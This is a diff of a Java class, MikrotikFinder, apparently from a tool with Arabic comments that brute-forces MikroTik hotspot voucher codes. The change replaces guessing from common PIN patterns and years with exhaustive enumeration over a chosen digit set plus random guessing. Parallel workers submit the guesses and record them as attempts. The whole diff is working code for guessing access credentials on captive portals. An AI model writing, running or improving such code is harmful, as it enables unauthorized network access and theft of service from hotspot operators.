@@ -41,10 +41,8 @@ public class MikrotikFinder {
     private final AtomicBoolean running = new AtomicBoolean(false);
     private final java.util.Set<String> triedInSession = java.util.Collections.synchronizedSet(new java.util.HashSet<>());
     private final AtomicLong totalAttempts = new AtomicLong(0);
-    private final java.util.List<String> customSequences;
-    private int customIndex = 0;
-    private final java.util.List<String> smartPatterns = new java.util.ArrayList<>();
-    private int smartIndex = 0;
+    private final String allowedDigits;
+    private final java.util.concurrent.atomic.AtomicLong counter = new java.util.concurrent.atomic.AtomicLong(0);
     private final java.util.concurrent.atomic.AtomicInteger recentErrors = new java.util.concurrent.atomic.AtomicInteger(0);
     private final java.util.List<String> candidates = java.util.Collections.synchronizedList(new java.util.ArrayList<>());
     private final java.util.Map<String, String> candidateDetails = new java.util.concurrent.ConcurrentHashMap<>();
@@ -62,7 +60,7 @@ public class MikrotikFinder {
                           String prefix, String middle, String suffix,
                           int varDigits, int maxAttempts, int waitMs, int parallel,
                           boolean relax, GuessDatabase db,
-                          java.util.List<String> customSeqs) {
+                          String allowedDigits) {
         this.rawUrl = cleanUrl(convertArabicNumerals(rawUrl));
         String calcBase;
         try {
@@ -86,10 +84,7 @@ public class MikrotikFinder {
         this.parallel = Math.max(1, Math.min(20, parallel));
         this.relax = relax;
         this.db = db;
-        this.customSequences = new java.util.ArrayList<>();
-        if (customSeqs != null) this.customSequences.addAll(customSeqs);
-        // 🧠 توليد أنماط التخمين الذكي
-        initSmartPatterns();
+        this.allowedDigits = (allowedDigits == null || allowedDigits.isEmpty()) ? "0123456789" : allowedDigits;
         // 🧠 منطق عدم التكرار الذكي
         try {
             String savedPrefix = db.getConfig("prefix");
@@ -153,35 +148,6 @@ public class MikrotikFinder {
             for (int i = 0; i < parallel; i++) pool.submit(new Worker(i));
         } catch (Exception e) {
             fail("خطأ تجهيز: " + e.getMessage());
-        }
-    }
-
-    private void initSmartPatterns() {
-        int d = varDigits;
-        // 1. أرقام متكررة (0000, 1111, ..., 9999)
-        for (char ch = '0'; ch <= '9'; ch++) {
-            StringBuilder sb = new StringBuilder();
-            for (int i = 0; i < d; i++) sb.append(ch);
-            smartPatterns.add(sb.toString());
-        }
-        // 2. تسلسل تصاعدي (0123, 1234, ...)
-        StringBuilder seq = new StringBuilder();
-        for (int i = 0; i < d; i++) seq.append((i + 1) % 10);
-        smartPatterns.add(seq.toString());
-        // 3. تسلسل تنازلي
-        StringBuilder rev = new StringBuilder();
-        for (int i = 0; i < d; i++) rev.append((9 - i) % 10);
-        smartPatterns.add(rev.toString());
-        // 4. أنماط شائعة
-        String[] common = {"0000", "1111", "1234", "4321", "2580", "1212", "1313", "2024", "2023", "2025"};
-        for (String cs : common) {
-            if (cs.length() >= d) smartPatterns.add(cs.substring(0, d));
-            else smartPatterns.add(cs);
-        }
-        // 5. سنوات (1990-2025)
-        for (int yr = 1990; yr <= 2025; yr++) {
-            String s = String.valueOf(yr);
-            if (s.length() >= d) smartPatterns.add(s.substring(s.length() - d));
         }
     }
 
@@ -411,43 +377,48 @@ public class MikrotikFinder {
     }
 
     private String generateVoucher() {
-        // 🎯 1. الأرقام المخصصة فقط (إذا وُجدت)
-        if (customSequences != null && !customSequences.isEmpty()) {
-            if (customIndex < customSequences.size()) {
-                String seq = customSequences.get(customIndex++);
-                String v = buildVoucherWithVar(seq);
-                triedInSession.add(seq);
+        int base = allowedDigits.length();
+        
+        // 🎯 إذا كانت الأرقام مسموحة محدودة (مثل 12345)، عدّد منهجياً
+        long total = 1;
+        for (int i = 0; i < varDigits; i++) {
+            total *= base;
+            if (total > 100000000L) { total = 100000000L; break; }
+        }
+        
+        // إذا كانت الأرقام المسموحة محدودة (أقل من 10) → تعداد منهجي كامل
+        if (base < 10) {
+            for (int attempt = 0; attempt < 300; attempt++) {
+                long idx = counter.getAndIncrement();
+                if (idx >= total) return null;
+                
+                char[] seq = new char[varDigits];
+                long n = idx;
+                for (int i = varDigits - 1; i >= 0; i--) {
+                    seq[i] = allowedDigits.charAt((int)(n % base));
+                    n /= base;
+                }
+                String seqStr = new String(seq);
+                if (triedInSession.contains(seqStr)) continue;
+                triedInSession.add(seqStr);
+                String v = buildVoucherWithVar(seqStr);
                 db.addAttemptWithStatus(v, "pending", null);
                 return v;
             }
-            // ⛔ نفدت الأرقام المخصصة — توقف (لا تخمين عشوائي)
             return null;
         }
         
-        // 🧠 2. الأنماط الذكية (بدون أرقام مخصصة)
-        while (smartIndex < smartPatterns.size()) {
-            String seq = smartPatterns.get(smartIndex++);
-            if (seq.length() != varDigits) continue;
-            if (triedInSession.contains(seq)) continue;
-            String v = buildVoucherWithVar(seq);
-            if (varDigits >= 4 && db.existsVarPart(prefix + seq)) continue;
-            triedInSession.add(seq);
+        // عشوائي من الأحرف المسموحة (جميع الأرقام 0-9)
+        for (int attempt = 0; attempt < 500; attempt++) {
+            StringBuilder sb = new StringBuilder();
+            for (int j = 0; j < varDigits; j++) {
+                sb.append(allowedDigits.charAt((int)(Math.random() * base)));
+            }
+            String seqStr = sb.toString();
+            if (triedInSession.contains(seqStr)) continue;
+            triedInSession.add(seqStr);
+            String v = buildVoucherWithVar(seqStr);
             db.addAttemptWithStatus(v, "pending", null);
-            return v;
-        }
-        
-        // 🎲 3. عشوائي (بدون أرقام مخصصة)
-        long max = (long) Math.pow(10, Math.min(varDigits, 12));
-        int maxTries = varDigits >= 4 ? 3000 : 200;
-        for (int i = 0; i < maxTries; i++) {
-            long num = (long)(Math.random() * max);
-            String seq = pad(num, varDigits);
-            String varPart = prefix + seq;
-            if (triedInSession.contains(seq)) continue;
-            if (varDigits >= 4 && db.existsVarPart(varPart)) continue;
-            triedInSession.add(seq);
-            String v = buildVoucherWithVar(seq);
-            db.addAttemptFull(v, varPart, "pending", null);
             return v;
         }
         return null;
